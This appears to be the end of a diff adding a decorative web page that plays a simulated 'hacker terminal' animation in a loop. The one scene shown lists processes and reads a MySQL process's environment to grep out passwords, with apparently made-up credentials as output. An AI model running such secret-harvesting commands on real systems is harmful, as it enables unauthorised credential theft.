+  /* 15. Process listing + memory reading */
+  { label: 'process analysis',
+    lines: [
+      { cmd:true, t:'root@target:~# ps auxf | grep -v "\\[" | head -20' },
+      { t:'USER         PID %CPU %MEM    VSZ   RSS TTY    STAT  COMMAND', c:'l-dim' },
+      { t:'root           1  0.0  0.1 167884 11232 ?      Ss   /sbin/init', c:'l-dim' },
+      { t:'root         384  0.0  0.1  14228  4348 ?      Ss   /usr/sbin/sshd -D', c:'l-dim' },
+      { t:'root         847  0.3  1.2 452312 48220 ?      S    /usr/sbin/apache2 -k start', c:'l-dim' },
+      { t:'mysql        921  0.4  3.8 1832440 152408 ?    Sl   /usr/sbin/mysqld', c:'l-dim' },
+      { t:'redis        934  0.1  0.4  64812 16228 ?      Ssl  /usr/bin/redis-server 0.0.0.0:6379', c:'l-warn' },
+      { cmd:true, t:'root@target:~# cat /proc/921/cmdline | tr "\\0" " "' },
+      { t:'/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log', c:'l-dim' },
+      { cmd:true, t:'root@target:~# cat /proc/921/environ | tr "\\0" "\\n" | grep -iE "pass|secret|key"' },
+      { t:'MYSQL_ROOT_PASSWORD=Sup3rS3cr3t!@2024', c:'l-err' },
+      { t:'MYSQL_REPLICATION_PASSWORD=R3pl!cat10n#2024', c:'l-err' },
+    ]
+  },
+
+];
+
+/* ---- shuffle helper ---- */
+function shuffle(arr) {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+  return arr;
+}
+
+/* ---- main loop: play all scenes, then shuffle & repeat ---- */
+async function main() {
+  appendLine('Parrot OS 6.1 — security edition', 'l-dim');
+  appendLine('root@parrot:~# █', 'l-ok');
+  await sleep(800);
+
+  const order = shuffle([...Array(scenes.length).keys()]);
+  let idx = 0;
+
+  while (true) {
+    const scene = scenes[order[idx % order.length]];
+    await playScene(scene);
+    idx++;
+    if (idx % scenes.length === 0) shuffle(order);
+    await sleep(300 + Math.random() * 400);
+  }
+}
+
+main();
+</script>
+</body>
+</html>
